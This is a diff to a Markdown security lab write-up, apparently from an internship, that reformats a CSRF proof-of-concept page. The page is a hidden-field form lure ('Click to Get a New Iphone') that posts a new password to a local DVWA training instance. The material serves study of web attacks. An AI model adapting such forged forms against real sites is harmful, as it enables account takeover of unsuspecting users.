@@ -136,14 +136,13 @@ Example Malicious Payload (attack.html):
 
 #### HTML
 
-<html><form action="http://127.0.0.1/DVWA/CSRF/" method="POST">
-    
- Click to Get a New Iphone <input type="hidden" value="12345" name="new_password">
+    <html><form action="http://127.0.0.1/DVWA/CSRF/" method="POST">  
+    Click to Get a New Iphone <input type="hidden" value="12345" name="new_password">
     <input type="hidden" name="user_token" value="12345">
     <input type="submit" value="submit">
-</form>
-  </body>
-</html>
+    </form>
+    </body>
+    </html>
 
 ***HTML Page***
 ![csrf image index.html](https://github.com/pranayvasanth/ApexPlantes-Internship/blob/main/forged%20site.png?raw=true)
